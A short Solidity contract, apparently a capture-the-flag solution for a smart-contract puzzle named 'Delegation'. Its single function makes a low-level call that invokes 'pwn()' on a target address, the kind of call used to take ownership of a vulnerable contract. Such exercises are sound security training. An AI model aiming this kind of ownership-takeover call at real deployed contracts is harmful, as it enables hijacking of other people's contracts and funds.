// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
error CallNotSuccess(bytes data);

contract Delegation {
    function pwnNaJa(address target) public {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("pwn()")
        );
        if (!success) revert CallNotSuccess(data);
    }
}
